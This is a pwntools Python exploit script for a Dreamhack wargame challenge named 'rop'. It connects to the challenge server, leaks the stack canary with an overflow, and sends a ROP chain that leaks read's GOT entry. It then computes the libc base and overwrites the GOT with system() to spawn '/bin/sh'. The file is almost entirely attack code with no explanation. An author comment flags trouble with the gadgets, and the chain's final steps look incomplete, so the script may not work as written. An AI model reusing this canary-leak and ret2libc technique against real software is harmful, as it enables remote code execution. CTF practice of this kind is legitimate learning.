#!/usr/bin/env python3
# Name: remote_rop.py
from pwn import *

#p = process('./rop')
p = remote('host1.dreamhack.games', 11327)
e = ELF('./rop')
libc = ELF('./libc.so.6')

# address
read_plt = e.plt['read']
write_plt = e.plt['write']
read_got_entry = e.got['read'] 

read_libc = libc.symbols['read']
system_libc = libc.symbols['system']

pop_rdi_ret = 0x0000000000400853
pop_rsi_pop_r15_ret = 0x0000000000400851
ret = 0x0000000000400596

# Get Cananry
getCnry = b'A' * 0x39 

p.sendafter(b'Buf: ', getCnry)
print(f"p.recvuntil(getCnry) : {p.recvuntil(getCnry)}")
cnry = b'\x00' + p.recvn(7)
print(cnry)
print(f"format(u64(cnry), x) : {format(u64(cnry), 'x')}")

payload = b'A' * 0x39 + cnry + b'B' * 0x8 

# Leak the read_got's address and print it on the STD_OUTPUT
# It is like write(1, read_got_entry
# 8 + 8 + 8(ret)
payload += p64(pop_rdi_ret) + p64(1)
# 8 + 8 + 8 + 8(ret)
payload += p64(pop_rsi_pop_r15_ret) + p64(read_got_entry) + p64(0)
# 8
payload += p64(write_plt)

# Make environment which inputs the system()'s address and '/bin/sh'
# It is like read(0, read_got_entry)
# 8 + 8 + 8(ret)
payload += p64(pop_rdi_ret) + p64(0)
# 8 + 8 + 8 + 8
payload += p64(pop_rsi_pop_r15_ret) + p64(read_got_entry) + p64(0)
# 8
payload += p64(read_plt)

# Overwriting the system()'s address into 'read GOT address' 
# 8 + 8 + 8(ret)
payload += p64(pop_rdi_ret) + p64(read_got_entry+0x8)
# 8
payload += p64(read_plt)

p.sendafter(b'Buf: ', payload)

# pause
#print(f"u64(p.recvn(8)) : {u64(p.recvn(8))}")
#print(f"len(p.recv) : {len(p.recv())}")

# *** TROUBLE, I think I should change gadgets here all ****
read_got = p.recvn(6) + b'\x00'*2

print(f"read_got : {read_got}")
lb = u64(read_got) - read_libc
print(f"lb : {lb}")
system = lb + system_libc
print(f'p64(system) : {p64(system)}')
p.send(p64(system) + b'/bin/sh\x00')

































































